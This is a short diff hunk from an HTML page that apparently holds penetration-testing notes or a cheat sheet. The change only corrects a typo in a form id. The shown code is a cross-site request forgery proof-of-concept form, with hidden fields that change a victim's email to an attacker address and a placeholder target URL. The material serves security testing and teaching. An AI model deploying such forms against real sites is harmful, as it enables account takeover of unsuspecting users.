@@ -693,7 +693,7 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 	<pre><code>		
 &lt;html&gt;
     &lt;body&gt;
-        &lt;form id="csfrForm" action=&quot;https://ACTION_URL.COM&quot; method=&quot;POST&quot;&gt;
+        &lt;form id="csrfForm" action=&quot;https://ACTION_URL.COM&quot; method=&quot;POST&quot;&gt;
 	    &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;ATTACKER@MAIL.HACK&quot; /&gt;
 	    &lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;YOUR_CSRF&quot; /&gt;
 	&lt;/form&gt;
